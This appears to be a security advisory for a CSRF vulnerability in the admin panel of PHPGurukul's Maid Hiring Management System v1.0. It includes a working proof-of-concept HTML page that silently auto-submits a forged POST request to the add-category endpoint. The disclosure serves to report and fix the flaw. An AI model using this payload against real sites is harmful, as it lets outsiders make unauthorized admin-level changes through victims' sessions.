**Project Name & Repo URL:**
[Maid Hiring Management System using PHP and MySQL](https://phpgurukul.com/maid-hiring-management-system-using-php-and-mysql/)

**Vulnerability Type:**
Client Side Request Forgery

**Affected Version(s):** v1.0

**💣Vulnerability Description:**
A Cross-Site Request Forgery (CSRF) vulnerability exists in the admin panel of PHPGurukul Hiring Management System, allowing an attacker to add arbitrary hiring categories by tricking an authenticated admin into visiting a malicious site. This can lead to data pollution and unauthorized admin-level changes.

**👩‍💻Impact:**
Unauthorized category creation

**🛜Proof-of-Concept (PoC)**
1) There was a category add functionality where only authenticated admin can add category.
![1](https://github.com/user-attachments/assets/6547be87-9f43-4e34-b8c0-e4138ac3f9e3)
2) Craft a POST request to the endpoint `/admin/add-category.php`
**CSRF-POC**

<html>
  <body>
    <form action="http://127.0.0.1/mhms/admin/add-category.php" method="POST">
      <input type="hidden" name="catname" value="CSRF&#45;POC" />
      <input type="hidden" name="submit" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
